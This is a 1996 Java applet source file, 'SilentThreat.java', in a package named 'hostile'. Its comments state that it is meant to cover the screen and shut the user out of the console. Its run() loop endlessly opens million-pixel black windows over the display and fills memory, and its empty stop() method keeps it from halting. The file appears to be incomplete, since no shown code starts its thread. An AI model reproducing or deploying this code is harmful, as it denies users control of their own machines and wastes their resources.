package hostile;
/* SilentThreat.java by Mark D. LaDue */

/* February 21, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to spew forth huge non-functioning
   black windows and obliterate the screen in order to exclude the
   user from the console. */ 

import java.awt.*;

public class SilentThreat extends java.applet.Applet implements Runnable {

//  This thread will attempt to spew forth huge windows and waste resources 
    Thread wasteResources = null;

//  An offscreen Image where lots of action will take place
//    Image offscreenImage;

//  Graphics tools to handle the offscreen Image
//    Graphics offscreenGraphics;

//  To avoid arrays and have open-ended storage of results
    StringBuffer holdBigNumbers = new StringBuffer(0);

//  A window that repeatedly tries to obscure everything 
    Frame littleWindow;


/*  Create the offscreen graphics  */ 

    public void init() {
//    offscreenImage = createImage(100, 100);
//    offscreenGraphics = offscreenImage.getGraphics();
    }


/*  We certainly won't be stopping anything */

    public void stop() {}


/* Repeatedly open windows
   while doing lots of other wasteful operations */ 

    public void run() {

//  Now fill the screen with huge windows, one atop another, and do
//  a lots of wasteful stuff!

        while (true) {
        try {
        holdBigNumbers.append(0x7fffffffffffffffL);
        littleWindow = new SilentFrame("ACK!"); // create a window
        littleWindow.resize(1000000, 1000000);  // make it big!
//        Point pt = location();  // find out where the applet is positioned
        littleWindow.move(-1000, -1000);  // cover everything
        littleWindow.show();  //  now open the big window 
        }
        catch (OutOfMemoryError o) {}
        repaint();
        }
    }


/*  Paints the applet's offscreen Image */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
//    offscreenGraphics.setColor(Color.white);
//    offscreenGraphics.drawRect(0, 0, 100, 100);
//    offscreenGraphics.setColor(Color.blue);
//    offscreenGraphics.drawString(holdBigNumbers.toString(), 10, 50);
    }
}

/* Makes the big, opaque windows */

class SilentFrame extends Frame {
    Label l;

//  Constructor method
    SilentFrame(String title) {
        setLayout(new GridLayout(1, 1));
        Canvas blackCanvas = new Canvas();
        blackCanvas.setBackground(Color.black);
        add(blackCanvas);
    }
}

